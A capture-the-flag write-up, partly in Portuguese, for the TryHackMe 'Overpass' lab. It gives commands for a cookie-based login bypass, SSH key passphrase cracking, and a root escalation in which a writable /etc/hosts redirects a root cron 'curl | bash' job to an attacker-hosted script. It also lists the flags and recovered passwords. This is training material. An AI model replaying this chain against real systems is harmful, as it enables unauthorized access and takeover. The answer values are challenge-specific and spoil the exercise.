# overpass — TryHackMe

```text
[ TARGET ] 10.64.187.55
[ ROOM   ] Overpass
[ GOAL   ] user.txt / root.txt
[ STATUS ] DONE
```

## 01 — Web / login bypass

```console
$ curl -s http://10.64.187.55/login.js
# SessionToken = resposta de /api/login (só no client)

$ # bypass: cookie arbitrário
document.cookie = "SessionToken=abc123; path=/";
$ curl -s -b "SessionToken=abc123" http://10.64.187.55/admin/
# RSA privada de James (encrypted)
```

## 02 — Crack chave + SSH

```console
$ python3 ssh2john.py james_id_rsa > james.hash
$ john --wordlist=rockyou.txt james.hash
passphrase: james13

$ chmod 600 james_id_rsa
$ ssh -i james_id_rsa james@10.64.187.55
$ cat user.txt
thm{65c1aaf000506e56996822c6281e6bf7}
```

## 03 — Loot local

```console
$ cat ~/.overpass
# decode → [{"name":"System","pass":"saydrawnlyingpicture"}]

$ sudo -l
# sem sudo para james
```

## 04 — Cron root (hosts writable)

```console
$ cat /etc/crontab
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

$ ls -l /etc/hosts
-rw-rw-rw- 1 root root … /etc/hosts

$ # aponta overpass.thm → IP VPN do attacker
$ # serve downloads/src/buildscript.sh (HTTP :80)
$ # cron root baixa e executa → root shell
```

```console
$ cat /root/root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}
```

## FLAGS / RESPOSTAS

| Item | Valor |
|---|---|
| user.txt | `thm{65c1aaf000506e56996822c6281e6bf7}` |
| root.txt | `thm{7f336f8c359dbac18d54fdd64ea753bb}` |
| james SSH key pass | `james13` |
| .overpass System | `saydrawnlyingpicture` |
